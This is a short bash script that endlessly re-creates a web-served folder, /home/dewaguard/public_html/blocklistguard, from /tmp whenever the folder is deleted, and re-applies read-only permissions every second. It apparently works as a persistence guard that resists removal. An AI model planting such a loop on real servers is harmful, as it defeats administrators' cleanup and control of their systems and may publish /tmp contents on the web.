#!/bin/bash

folder_path="/home/dewaguard/public_html/blocklistguard"
backup_path="/tmp"

while true
do
    if [ ! -d "$folder_path" ]; then
        cp -r "$backup_path" "$folder_path"
    fi

    chmod -R 0555 "$folder_path"
    sleep 1
done